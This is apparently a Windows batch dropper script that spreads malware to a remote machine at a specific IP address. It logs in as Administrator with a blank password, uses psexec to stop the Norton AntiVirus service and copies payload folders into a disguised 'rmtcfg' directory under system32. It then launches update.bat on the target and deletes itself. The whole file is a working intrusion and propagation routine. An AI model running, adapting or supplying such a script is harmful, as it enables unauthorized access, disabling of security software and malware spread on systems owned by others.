net use w: /delete
net use \\67.20.158.64 /USER:Administrator
net use w: \\67.20.158.64\C$
psexec \\67.20.158.64 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\67.20.158.64 -u Administrator -p "" -c temp.bat
mkdir w:\winnt\system32\rmtcfg
mkdir w:\winnt\system32\catroot
copy copy\* w:\winnt\system32\rmtcfg
mkdir w:\winnt\system32\rmtcfg\files
mkdir w:\winnt\system32\rmtcfg\files\copy
mkdir w:\winnt\system32\rmtcfg\files\dat
mkdir w:\winnt\system32\rmtcfg\files\log
mkdir w:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* w:\winnt\system32\rmtcfg\files
copy copy\* w:\winnt\system32\rmtcfg\files\copy
copy plugin\* w:\winnt\system32\rmtcfg\files\plugin
copy dat\* w:\winnt\system32\rmtcfg\files\dat
psexec \\67.20.158.64 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use w: /delete
net use \\67.20.158.64 /delete
del runme173475.bat
